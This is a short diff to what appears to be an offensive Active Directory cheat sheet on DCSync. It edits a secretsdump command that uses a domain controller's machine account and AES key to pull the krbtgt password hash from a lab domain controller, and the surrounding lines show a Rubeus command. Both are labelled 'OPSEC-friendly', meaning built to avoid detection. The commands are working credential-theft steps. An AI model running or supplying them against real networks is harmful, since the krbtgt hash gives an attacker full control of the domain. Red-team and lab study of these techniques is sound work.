@@ -565,7 +565,7 @@ DCSync uses the Directory Replication Service (DRS) to request hash synchronizat
 
 ```bash
 # OPSEC-friendly - from Linux using DC identity
-impacket-secretsdump -dc-ip 172.23.126.134 'yhp0w.lan/dc01$'@dc01.yhp0w.lan -aesKey f6cc80f83cfcfb67177a65d39d43c09c2ed07815e4dea3528e735cdd658b5ab2 -just-dc-user krbtgt
+secretsdump.py -dc-ip 172.23.126.134 'yhp0w.lan/dc01$'@dc01.yhp0w.lan -aesKey f6cc80f83cfcfb67177a65d39d43c09c2ed07815e4dea3528e735cdd658b5ab2 -just-dc-user krbtgt
 
 # OPSEC-friendly - from Windows using MSOL_ account
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show
